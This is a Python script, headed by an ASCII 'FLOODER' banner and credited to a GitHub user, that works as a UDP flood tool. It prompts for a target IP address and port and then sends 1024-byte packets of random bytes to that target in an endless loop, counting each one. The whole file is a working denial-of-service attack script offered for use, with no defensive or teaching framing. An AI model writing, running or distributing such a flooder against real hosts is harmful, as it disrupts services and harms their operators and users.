import sys
import time
import socket
import random

banner = (""" (     (        )      )  (           (     
 )\ )  )\ )  ( /(   ( /(  )\ )        )\ )  
(()/( (()/(  )\())  )\())(()/(   (   (()/(  
 /(_)) /(_))((_)\  ((_)\  /(_))  )\   /(_)) 
(_))_|(_))    ((_)   ((_)(_))_  ((_) (_))   
| |_  | |    / _ \  / _ \ |   \ | __|| _ \  
| __| | |__ | (_) || (_) || |) || _| |   /  
|_|   |____| \___/  \___/ |___/ |___||_|_\ \n
Made by goldshay135 https://github.com/goldshay135
""")

def plog(message, color):
	if color == 0:
		print("\033[1;32;31m" + "[*] " + message + "\033[m")
	elif color == 1:
		print("\033[1;32;32m" + "[*] " + message + "\033[m")
	elif color == 2:
		print("\033[1;32;33m" + "[*] " + message + "\033[m")
	elif color == 3:
		print("\033[1;32;35m" + "[*] " + message + "\033[m")

if __name__ == "__main__":
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1024)

	print("\033[1;32;31m" + banner + "\033[m")

	plog("Enter target IP:", 1)
	ip = input()

	plog("Enter target Port:", 1)
	port = input()

	sent = 0

	while True:
		try:
			sock.sendto(bytes, (ip, int(port)))
			sent = sent + 1

			plog("Sent {} Packets".format(sent), 1)
		except KeyboardInterrupt:
			plog("Exiting", 0)
			sys.exit()
